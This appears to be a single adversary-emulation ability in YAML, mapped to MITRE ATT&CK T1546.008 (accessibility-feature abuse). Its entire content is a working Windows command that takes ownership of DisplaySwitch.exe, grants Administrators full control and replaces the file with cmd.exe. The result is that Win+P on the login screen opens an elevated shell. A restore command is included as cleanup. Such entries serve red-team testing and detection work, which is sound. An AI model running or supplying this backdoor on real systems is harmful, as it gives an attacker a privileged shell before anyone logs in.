---
- id: fade1c747eddfe59a95b7ed44743cd25
  name: Replace DisplaySwitch.exe (Display Switcher binary) with cmd.exe
  description: 'Replace DisplaySwitch.exe (Display Switcher binary) with cmd.exe.
    This allows the user to launch an elevated command prompt by pressing the Windows
    Key + P on the login screen.

    '
  tactic: multiple
  technique:
    attack_id: T1546.008
    name: 'Event Triggered Execution: Accessibility Features'
  platforms:
    windows:
      cmd:
        command: IF NOT EXIST C:\Windows\System32\DisplaySwitch_backup.exe (copy C:\Windows\System32\DisplaySwitch.exe
          C:\Windows\System32\DisplaySwitch_backup.exe) ELSE ( pushd ) && takeown
          /F C:\Windows\System32\DisplaySwitch.exe /A && icacls C:\Windows\System32\DisplaySwitch.exe
          /grant Administrators:F /t && copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\DisplaySwitch.exe
        payloads: []
        cleanup: copy /Y C:\Windows\System32\DisplaySwitch_backup.exe C:\Windows\System32\DisplaySwitch.exe
